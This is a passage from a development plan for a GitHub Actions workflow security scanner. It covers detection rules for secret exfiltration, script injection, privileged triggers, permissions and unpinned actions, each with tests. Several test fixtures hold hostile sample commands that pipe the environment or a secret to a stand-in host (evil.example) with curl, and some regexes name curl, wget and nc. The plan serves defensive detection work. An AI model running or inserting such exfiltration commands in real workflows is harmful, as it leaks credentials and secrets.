- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_exfil.py  (append)
import credence.workflow_audit.rules.exfil_rules as _ex


def _run002(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(_ex.wf_exfil_002(wf, resolved, RuleContext()))


def test_env_piped_to_network_fires():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - run: env | curl --data-binary @- https://evil.example")
    assert any(f.rule_id == "WF-EXFIL-002" for f in out)


def test_echo_secret_to_log_fires():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  '      - run: echo "${{ secrets.PROD }}"')
    assert any(f.rule_id == "WF-EXFIL-002" for f in out)


def test_plain_echo_no_finding():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - run: echo hello")
    assert out == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_exfil.py -k exfil_002 -v`
Expected: FAIL — `wf_exfil_002` not defined

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/exfil_rules.py  (append)
_ENV_DUMP_RE = re.compile(r"\b(env|printenv|set)\b[^\n|]*\|\s*(curl|wget|nc)\b")
_ECHO_SECRET_RE = re.compile(
    r"\becho\b[^\n]*(\$\{\{\s*secrets\.[A-Za-z0-9_-]+\s*\}\})")


@register
def wf_exfil_002(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
                 ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            run = rs.normalized_run
            why = None
            if _ENV_DUMP_RE.search(run):
                why = "Environment dumped to an outbound call"
            elif _ECHO_SECRET_RE.search(run):
                why = "Secret echoed to the build log"
            else:
                for var in rs.secret_vars:
                    if re.search(rf"\becho\b[^\n]*\$\{{?{re.escape(var)}\b", run):
                        why = "Secret-tainted variable echoed to the build log"
                        break
            if why:
                out.append(make_finding(
                    "WF-EXFIL-002", "Environment/secret dump", Severity.HIGH,
                    Confidence.HIGH, file_path=wf.path, message=why, job=job_id,
                    step_index=rs.step.index, step_name=rs.step.name,
                    line=rs.step.line, snippet=run[:200],
                    cicd_sec=["CICD-SEC-6"], mitre=["T1552", "T1567"],
                    remediation="Never print secrets/env to logs or pipe env to the network.",
                ))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_exfil.py -v`
Expected: PASS (all exfil tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/exfil_rules.py tests/test_workflow_rule_exfil.py
git commit -m "feat(workflow-audit): WF-EXFIL-002 env/secret dump to network or log"
```

---

## Task 9: `WF-INJ-001` — script injection via untrusted context in `run:`

**Files:**
- Create: `credence/workflow_audit/rules/inject_rules.py`
- Test: `tests/test_workflow_rule_inject.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_inject.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.inject_rules as inj


def _run001(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(inj.wf_inj_001(wf, resolved, RuleContext()))


VULN = """
on: pull_request_target
jobs:
  b:
    runs-on: x
    steps:
      - run: echo "PR is ${{ github.event.pull_request.title }}"
"""
SAFE_ENV = """
on: pull_request_target
jobs:
  b:
    runs-on: x
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "PR is $TITLE"
"""
SUFFIX = """
on: issues
jobs:
  b:
    runs-on: x
    steps:
      - run: echo "${{ github.event.issue.body }}"
"""


def test_untrusted_context_in_run_fires_high():
    out = _run001(VULN)
    assert any(f.rule_id == "WF-INJ-001" and f.severity.value == "HIGH" for f in out)


def test_env_bound_untrusted_context_is_safe():
    # the untrusted value is bound via env: and referenced as $TITLE -> not a finding
    assert _run001(SAFE_ENV) == []


def test_suffix_heuristic_event_field_fires():
    assert any(f.rule_id == "WF-INJ-001" for f in _run001(SUFFIX))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_inject.py -k inj_001 -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/inject_rules.py
"""Pillar 1 injection rules: WF-INJ-001 (untrusted context in run:),
WF-INJ-002 (untrusted input -> GITHUB_ENV / GITHUB_PATH)."""

from __future__ import annotations

import re
from typing import Dict, Iterable, List

from ..models import Confidence, ResolvedStep, Severity, Workflow
from ..platforms import untrusted_contexts
from . import RuleContext, make_finding, register


def _script_bodies(rs: ResolvedStep) -> List[str]:
    """run: text, plus actions/github-script inline `script:` (F-013)."""
    bodies = []
    if rs.step.run:
        bodies.append(rs.step.run)
    uses = (rs.step.uses or "")
    if "actions/github-script" in uses:
        script = rs.step.with_.get("script")
        if isinstance(script, str):
            bodies.append(script)
    return bodies


@register
def wf_inj_001(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
               ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            for body in _script_bodies(rs):
                found = untrusted_contexts(body)
                if found:
                    out.append(make_finding(
                        "WF-INJ-001", "Script injection via untrusted context",
                        Severity.HIGH, Confidence.HIGH, file_path=wf.path,
                        message=f"Untrusted context interpolated into a script body: {found[0]}",
                        job=job_id, step_index=rs.step.index, step_name=rs.step.name,
                        line=rs.step.line, snippet=body[:200],
                        cicd_sec=["CICD-SEC-4"], mitre=["T1059"],
                        remediation="Bind the value to an env: var and reference $VAR (quoted).",
                    ))
                    break
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_inject.py -k inj_001 -v`
Expected: PASS (3 tests; the `env:`-bound safe form does NOT fire because the untrusted expression is not in the `run:`/script body)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/inject_rules.py tests/test_workflow_rule_inject.py
git commit -m "feat(workflow-audit): WF-INJ-001 script injection (explicit list + suffix heuristic)"
```

---

## Task 10: `WF-INJ-002` — untrusted input to `$GITHUB_ENV` / `$GITHUB_PATH`

**Files:**
- Modify: `credence/workflow_audit/rules/inject_rules.py`
- Test: `tests/test_workflow_rule_inject.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_inject.py  (append)
import credence.workflow_audit.rules.inject_rules as _inj


def _run002(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(_inj.wf_inj_002(wf, resolved, RuleContext()))


def test_untrusted_to_github_env_fires():
    out = _run002(
        "on: issue_comment\njobs:\n  b:\n    runs-on: x\n    steps:\n"
        '      - run: echo "VALUE=${{ github.event.comment.body }}" >> $GITHUB_ENV')
    assert any(f.rule_id == "WF-INJ-002" for f in out)


def test_static_github_env_write_no_finding():
    out = _run002(
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
        '      - run: echo "VALUE=constant" >> $GITHUB_ENV')
    assert out == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_inject.py -k inj_002 -v`
Expected: FAIL — `wf_inj_002` not defined

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/inject_rules.py  (append)
_GH_ENV_RE = re.compile(r">>?\s*\"?\$\{?(?:GITHUB_ENV|GITHUB_PATH)\b")


@register
def wf_inj_002(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
               ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            run = rs.step.run or ""
            if _GH_ENV_RE.search(run) and untrusted_contexts(run):
                out.append(make_finding(
                    "WF-INJ-002", "Untrusted input written to GITHUB_ENV/GITHUB_PATH",
                    Severity.HIGH, Confidence.MEDIUM, file_path=wf.path,
                    message="Untrusted context written to $GITHUB_ENV/$GITHUB_PATH (env/PATH injection)",
                    job=job_id, step_index=rs.step.index, step_name=rs.step.name,
                    line=rs.step.line, snippet=run[:200],
                    cicd_sec=["CICD-SEC-4"], mitre=["T1059"],
                    remediation="Sanitize untrusted input; never write it to GITHUB_ENV/GITHUB_PATH.",
                ))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_inject.py -v`
Expected: PASS (all inject tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/inject_rules.py tests/test_workflow_rule_inject.py
git commit -m "feat(workflow-audit): WF-INJ-002 GITHUB_ENV/GITHUB_PATH injection"
```

---

## Task 11: `WF-CFG-001..003` — triggers/checkout, permissions, unpinned actions

**Files:**
- Create: `credence/workflow_audit/rules/config_rules.py`
- Test: `tests/test_workflow_rule_config.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_config.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.config_rules as cfg


def _run(fn, text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(fn(wf, resolved, RuleContext()))


PWN = """
on: pull_request_target
jobs:
  b:
    runs-on: x
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
"""
SAFE_CHECKOUT = """
on: pull_request_target
jobs:
  b:
    runs-on: x
    steps:
      - uses: actions/checkout@v4
"""


def test_cfg_001_pwn_request_fires_high():
    out = _run(cfg.wf_cfg_001, PWN)
    assert any(f.rule_id == "WF-CFG-001" and f.severity.value == "HIGH" for f in out)


def test_cfg_001_base_checkout_safe():
    assert _run(cfg.wf_cfg_001, SAFE_CHECKOUT) == []


def test_cfg_002_write_all_fires():
    out = _run(cfg.wf_cfg_002,
               "on: push\njobs:\n  b:\n    runs-on: x\n    permissions: write-all\n    steps: []")
    assert any(f.rule_id == "WF-CFG-002" for f in out)


def test_cfg_002_absent_permissions_fires():
    out = _run(cfg.wf_cfg_002,
               "on: push\njobs:\n  b:\n    runs-on: x\n    steps: []")
    assert any(f.rule_id == "WF-CFG-002" for f in out)


def test_cfg_002_explicit_read_is_clean():
    out = _run(cfg.wf_cfg_002,
               "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: x\n    steps: []")
    assert out == []


def test_cfg_003_branch_pin_medium_sha_clean():
    branch = _run(cfg.wf_cfg_003, "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - uses: some/action@main")
    assert any(f.rule_id == "WF-CFG-003" and f.severity.value == "MEDIUM" for f in branch)
    sha = _run(cfg.wf_cfg_003, "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
               "      - uses: some/action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0")
    assert [f for f in sha if f.rule_id == "WF-CFG-003"] == []


def test_cfg_003_first_party_action_clean():
    out = _run(cfg.wf_cfg_003, "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
               "      - uses: actions/checkout@v4")
    # actions/* and github/* are first-party; @tag is Low, not flagged at default
    assert all(f.severity.value != "MEDIUM" for f in out)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_config.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/config_rules.py
"""Pillar 3 blast-radius rules WF-CFG-001..006."""

from __future__ import annotations

import re
from typing import Dict, Iterable, List

from ..models import Confidence, ResolvedStep, Severity, Workflow
from ..platforms import (
    CANONICAL_PRIVILEGED_TRIGGERS, PRIVILEGED_TRIGGERS, is_pr_controlled_ref,
)
from . import RuleContext, make_finding, register

_SHA_RE = re.compile(r"@[0-9a-f]{40}$")
_FIRST_PARTY = ("actions/", "github/")


@register
def wf_cfg_001(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    triggers = set(wf.on_events)
    privileged = triggers & PRIVILEGED_TRIGGERS
    if not privileged:
        return []
    out: List = []
    canonical = bool(triggers & CANONICAL_PRIVILEGED_TRIGGERS)
    for job in wf.jobs:
        for step in job.steps:
            if step.uses and "actions/checkout" in step.uses:
                ref = str(step.with_.get("ref", ""))
                if is_pr_controlled_ref(ref):
                    out.append(make_finding(
                        "WF-CFG-001", "Privileged trigger checks out untrusted PR code",
                        Severity.HIGH,
                        Confidence.HIGH if canonical else Confidence.MEDIUM,
                        file_path=wf.path,
                        message=f"{', '.join(sorted(privileged))} + checkout of PR-controlled ref",
                        job=job.job_id, step_index=step.index, step_name=step.name,
                        line=step.line, snippet=ref[:120],
                        cicd_sec=["CICD-SEC-4"], mitre=["T1195"],
                        remediation="Do not checkout PR head under privileged triggers; use the workflow_run split.",
                    ))
    return out


def _is_broad(perms) -> bool:
    if perms == "write-all":
        return True
    if isinstance(perms, dict):
        return perms.get("id-token") == "write" and perms.get("contents") == "write"
    return False


@register
def wf_cfg_002(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    # absent at both workflow and job level, OR explicitly broad
    if wf.permissions_absent and all(j.permissions_absent for j in wf.jobs):
        return [make_finding(
            "WF-CFG-002", "No explicit permissions (broad default token)",
            Severity.MEDIUM, Confidence.HIGH, file_path=wf.path,
            message="No permissions: block; GITHUB_TOKEN inherits broad default",
            line=1, cicd_sec=["CICD-SEC-5"], mitre=[],
            remediation="Add a least-privilege permissions: block (start from contents: read).")]
    out: List = []
    if _is_broad(wf.permissions):
        out.append(make_finding(
            "WF-CFG-002", "Excessive workflow permissions", Severity.MEDIUM,
            Confidence.HIGH, file_path=wf.path, message="Workflow grants broad permissions",
            line=1, cicd_sec=["CICD-SEC-5"], mitre=[],
            remediation="Scope permissions to the minimum required."))
    for j in wf.jobs:
        if _is_broad(j.permissions):
            out.append(make_finding(
                "WF-CFG-002", "Excessive job permissions", Severity.MEDIUM,
                Confidence.HIGH, file_path=wf.path,
                message=f"Job '{j.job_id}' grants broad permissions", job=j.job_id,
                line=j.line, cicd_sec=["CICD-SEC-5"], mitre=[],
                remediation="Scope job permissions to the minimum required."))
    return out


@register
def wf_cfg_003(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    out: List = []
    for job in wf.jobs:
        for step in job.steps:
            uses = step.uses or ""
            if not uses or "@" not in uses or uses.startswith("./") or uses.startswith("docker://"):
                if uses.startswith("docker://"):
                    out.append(make_finding(
                        "WF-CFG-003", "Docker action reference (unpinnable trust)",
                        Severity.MEDIUM, Confidence.MEDIUM, file_path=wf.path,
                        message=f"docker:// action: {uses}", job=job.job_id,
                        step_index=step.index, line=step.line,
                        cicd_sec=["CICD-SEC-3"], mitre=["T1195.2"],
                        remediation="Prefer SHA-pinned first-party actions over docker:// images."))
                continue
            if uses.startswith(_FIRST_PARTY):
                continue            # first-party @tag -> Low, not surfaced at default
            ref = uses.split("@", 1)[1]
            if _SHA_RE.search(uses):
                continue            # SHA-pinned third party -> clean (impostor check is best-effort, Plan 3)
            looks_branch = not re.match(r"v?\d", ref)
            out.append(make_finding(
                "WF-CFG-003", "Unpinned third-party action",
                Severity.MEDIUM if looks_branch else Severity.LOW,
                Confidence.MEDIUM, file_path=wf.path,
                message=f"Third-party action not SHA-pinned: {uses}", job=job.job_id,
                step_index=step.index, line=step.line,
                cicd_sec=["CICD-SEC-3"], mitre=["T1195.2"],
                remediation="Pin third-party actions to a full commit SHA."))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_config.py -v`
Expected: PASS (config 001–003 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/config_rules.py tests/test_workflow_rule_config.py
git commit -m "feat(workflow-audit): WF-CFG-001..003 triggers/permissions/pinning"
```

---

## Task 12: `WF-CFG-004..006` — self-hosted, artipacked, secrets-inherit

**Files:**
- Modify: `credence/workflow_audit/rules/config_rules.py`
- Test: `tests/test_workflow_rule_config.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_config.py  (append)
def test_cfg_004_self_hosted_on_pr_target():
    out = _run(cfg.wf_cfg_004,
               "on: pull_request_target\njobs:\n  b:\n    runs-on: self-hosted\n    steps: []")
    assert any(f.rule_id == "WF-CFG-004" for f in out)


def test_cfg_004_self_hosted_on_push_clean():
    out = _run(cfg.wf_cfg_004,
               "on: push\njobs:\n  b:\n    runs-on: self-hosted\n    steps: []")
    assert out == []


def test_cfg_005_artipacked_checkout_then_upload():
    text = ("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "      - uses: actions/upload-artifact@v4\n"
            "        with:\n          path: .\n")
    out = _run(cfg.wf_cfg_005, text)
    assert any(f.rule_id == "WF-CFG-005" for f in out)


def test_cfg_005_checkout_with_persist_false_clean():
    text = ("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n          persist-credentials: false\n"
            "      - uses: actions/upload-artifact@v4\n        with:\n          path: .\n")
    assert _run(cfg.wf_cfg_005, text) == []


def test_cfg_006_secrets_inherit():
    text = ("on: push\njobs:\n  b:\n    uses: ./.github/workflows/reusable.yml\n"
            "    secrets: inherit\n")
    out = _run(cfg.wf_cfg_006, text)
    assert any(f.rule_id == "WF-CFG-006" for f in out)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_config.py -k "cfg_004 or cfg_005 or cfg_006" -v`
Expected: FAIL — functions not defined

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/config_rules.py  (append)
def _runs_on_self_hosted(runs_on) -> bool:
    if isinstance(runs_on, str):
        return "self-hosted" in runs_on
    if isinstance(runs_on, list):
        return any("self-hosted" in str(x) for x in runs_on)
    return False


@register
def wf_cfg_004(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    if not (set(wf.on_events) & PRIVILEGED_TRIGGERS or "pull_request" in wf.on_events):
        return []
    out: List = []
    for job in wf.jobs:
        if _runs_on_self_hosted(job.runs_on):
            out.append(make_finding(
                "WF-CFG-004", "Self-hosted runner on fork/PR trigger",
                Severity.HIGH if set(wf.on_events) & CANONICAL_PRIVILEGED_TRIGGERS
                else Severity.MEDIUM,
                Confidence.MEDIUM, file_path=wf.path,
                message=f"Job '{job.job_id}' uses a self-hosted runner under an untrusted trigger",
                job=job.job_id, line=job.line, cicd_sec=["CICD-SEC-7"], mitre=[],
                remediation="Do not run untrusted code on self-hosted runners."))
    return out


@register
def wf_cfg_005(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    out: List = []
    for job in wf.jobs:
        checkout_persists = False
        uploads = False
        for step in job.steps:
            uses = step.uses or ""
            if "actions/checkout" in uses:
                persist = step.with_.get("persist-credentials")
                # default is true; only False disables it
                checkout_persists = str(persist).lower() != "false"
            if "actions/upload-artifact" in uses:
                uploads = True
        if checkout_persists and uploads:
            out.append(make_finding(
                "WF-CFG-005", "Checkout credentials may be packed into an artifact",
                Severity.MEDIUM, Confidence.MEDIUM, file_path=wf.path,
                message=f"Job '{job.job_id}': checkout persists credentials and an artifact is uploaded",
                job=job.job_id, line=job.line, cicd_sec=["CICD-SEC-6"], mitre=["T1552"],
                remediation="Set persist-credentials: false, or exclude .git from uploaded artifacts."))
    return out


@register
def wf_cfg_006(wf: Workflow, resolved, ctx: RuleContext) -> Iterable:
    out: List = []
    for job in wf.jobs:
        if job.secrets_inherit:
            out.append(make_finding(
                "WF-CFG-006", "secrets: inherit shares all secrets",
                Severity.MEDIUM, Confidence.MEDIUM, file_path=wf.path,
                message=f"Job '{job.job_id}' passes secrets: inherit to a reusable workflow",
                job=job.job_id, line=job.line, cicd_sec=["CICD-SEC-5"], mitre=[],
                remediation="Pass only the specific secrets the called workflow needs."))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_config.py -v`
Expected: PASS (all config tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/config_rules.py tests/test_workflow_rule_config.py
git commit -m "feat(workflow-audit): WF-CFG-004..006 self-hosted/artipacked/secrets-inherit"
```

---

## Task 13: Register all rule modules + end-to-end registry integration

**Files:**
- Modify: `credence/workflow_audit/rules/__init__.py`
- Test: `tests/test_workflow_rules_registry.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rules_registry.py  (append)
def test_run_rules_finds_multiple_pillars_and_respects_suppression():
    from credence.workflow_audit.parser import parse_workflow
    from credence.workflow_audit.taint import resolve_job
    from credence.workflow_audit.allowlist import parse_suppressions
    from credence.workflow_audit.rules import run_rules, RuleContext

    text = (
        "on: pull_request_target\n"
        "jobs:\n"
        "  b:\n"
        "    runs-on: x\n"
        "    env:\n      T: ${{ secrets.PROD }}\n"
        "    steps:\n"
        "      - run: curl -d \"$T\" https://evil.example  # credence:ignore WF-EXFIL-001 reason=nope\n"
        "      - run: some/action@main\n"
    )
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    ctx = RuleContext(suppressions=parse_suppressions(text))
    findings = run_rules(wf, resolved, ctx)
    ids = {f.rule_id for f in findings}
    # exfil + missing-permissions all fire
    assert "WF-EXFIL-001" in ids
    assert "WF-CFG-002" in ids
    # the High exfil finding is NON-suppressible despite the inline directive
    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"][0]
    assert exfil.suppressed is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rules_registry.py -k run_rules_finds_multiple -v`
Expected: FAIL — rules not registered (RULES empty because rule modules never imported)

- [ ] **Step 3: Write minimal implementation**

Append explicit imports at the **bottom** of `rules/__init__.py` so importing the package registers every rule:

```python
# credence/workflow_audit/rules/__init__.py  (append at very bottom)
# Import rule modules for their @register side effects. Keep at bottom to avoid
# circular imports (modules import make_finding/register from this package).
from . import exec_rules, exfil_rules, inject_rules, config_rules  # noqa: E402,F401
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rules_registry.py -v`
Expected: PASS — `RULES` now contains all 13 rules; high exfil stays non-suppressed.

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/__init__.py tests/test_workflow_rules_registry.py
git commit -m "feat(workflow-audit): register all rule modules + end-to-end registry test"
```

---

## Self-Review (against spec §4/§5/§6)

- **Rule coverage:** WF-EXEC-001/002 (T5–6) ✓; WF-EXFIL-001/002 (T7–8) ✓; WF-INJ-001/002 (T9–10) ✓; WF-CFG-001..006 (T11–12) ✓ = **12 rules**; `WF-HIST-001` is in Plan 3 (needs the history walk). 12 of 13 here, by design.
- **Hardenings wired:** F-001 cross-step exec (T5 via taint), F-002 decoder/interpreter set (T3 shellutil), F-003 env-resolved exfil (T7), F-004 DNS/dynamic/platform-channel sinks (T3/T7), F-007 non-suppressible high/crit (T4/T13), F-010 normalization consumed via `normalized_run`, F-011 trigger taxonomy (T2/T11), F-012 docker://+branch pin (T11; impostor SHA check deferred to Plan 3 history where object data exists), F-013 github-script body (T9).
- **Placeholder scan:** none — every step has complete code.
- **Type consistency:** rules use `make_finding(...)` → `WorkflowFinding`; `RuleContext` fields (`extra_hosts`, `suppressions`, `source`) match Plan 3 usage; `ResolvedStep.normalized_run`/`secret_vars`/`tainted_files` consumed exactly as defined in Plan 1; severities are `Severity.*` enums (`.value` uppercase for the gate).

## Boundary
Plan 2 delivers all content/inject/config detection over a single workflow's resolved view. It does **not** discover files, walk history, dedup, attach identity, render output, or wire the CLI — that is Plan 3. `WF-HIST-001` and the impostor-commit refinement live in Plan 3 because they require the git object/history layer.
